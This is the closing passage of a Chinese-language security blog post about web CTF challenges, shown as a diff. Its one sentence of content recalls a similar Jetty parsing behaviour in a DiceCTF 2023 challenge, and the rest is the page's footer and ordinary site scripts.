+<p>看完這題才突然想到以前 DiceCTF 2023 也出現過類似的題目，那時候是 jetty 有這個行為：<a href="https://blog.huli.tw/2023/03/26/dicectf-2023-writeup/#web-jnotes-6-solves">Web - jnotes (6 solves)</a>，看來搞不好還不少 web framework 有這個 parsing 行為。</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2023/11/27/server-side-rendering-ssr-and-isomorphic/">從歷史的角度探討多種 SSR（Server-side rendering）</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">評論</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>繁體中文</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2023/12/03/en/xss-and-web-challenges/" class="dropdown-item">
+                    English
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
